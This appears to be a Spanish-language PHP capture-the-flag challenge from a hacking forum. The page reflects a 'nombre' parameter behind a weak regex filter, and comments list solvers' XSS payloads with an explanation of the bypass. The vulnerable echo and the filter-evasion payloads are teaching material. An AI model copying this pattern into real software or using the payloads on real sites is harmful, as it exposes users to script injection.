<?php
/*
Author: 2Fac3R
Date: Abril 18, 2012
Title: [Reto] XSSme Lv.2
Site: HackxCrack

Objetivo:
Hacer el XSS, mostrar un alert de forma string.

*/
error_reporting(0);
$reto = $_GET['nombre'];
if(isset($reto) && !empty($reto)){
   if(!preg_match("/(^<|'|\"|>$)/",$reto)){ // Que facil! no?
      echo 'Bienvenido!! '.$reto;
   }else{
      echo "Estas intentando juakiarnos?";
   }
}else{
   if(isset($_GET['send'])){
      die("Debes ingresar tu nombre!");
   }
   ?>
    <form action="" method="GET">
        <input type="text" name="nombre">
        <input type="submit" name="send" value="Prestarme!"> </form>
    <?
}

/*
SOLUCIONES:
11Sep:
http://127.0.0.1/asd/?nombre=a%3Cscript%3Ealert%28%2F11Sep%2F%29%3B%3C%2Fscript%3Ea&send=Prestarme%21

kid_goth:
ret2Fac2.php?nombre=kid_<ScRiPt>alert(/kid_goth/)%3B</ScRiPt>goth&send=Prestarme!

z0mw33d:
&#32;<script>alert(/zW Dice K rulee!/)</script>&#32;

2Fac3R:
127.0.0.1/probar.php?nombre=2Fac<script>alert(String.fromCharCode(88, 83, 83, 101, 100))</script>3R&send=Prestarme!

SkippyCreammy
<script>alert(String.fromCharCode(106,117,97,107,105,97,100,111,32,120,68))</script>


EXPLICACION:
Como podrán observar, la expresión regular:
"/(^<|'|\"|>$)/"

Significa que no debe haber un "<" al comiezo ni un ">" al final, aparte de eso, está "prohíbido" las ' y ", 
así qué era tan facil como poner la inyección no al principio ni al fin y sin comilla simple y doble, 
como las soluciones de los participantes.

*/
?>